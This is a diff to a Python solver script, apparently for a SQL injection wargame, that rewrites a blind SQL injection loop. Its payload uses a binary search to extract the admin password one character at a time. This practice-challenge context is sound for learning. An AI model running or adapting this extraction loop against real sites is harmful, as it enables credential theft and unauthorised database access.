@@ -45,10 +45,18 @@ def main():
 
     print(len_of_key)
 
-    payload = "0||id like 0x61646d696e&&ord(mid(pw,%s,1))%s#"
-    param = dict(no=payload)
-    result = los.find_binary(url, param, check_func,
-                             32, 127, len_of_key, cook)
+    result = ''
+    num_of_requests = 0
+    for i in range(1, len_of_key + 1):
+        payload = f'0||id like 0x61646d696e&&ord(mid(pw,{i},1))<%s#'
+        param = dict(no=payload)
+        left, num_requests = los.find_binary(url, param, check_func,
+                                             32, 127, cook)
+        print(chr(left))
+        result += chr(left)
+        num_of_requests += num_requests
+
+    print('num_of_requests:', num_of_requests)
 
     print(result)
 
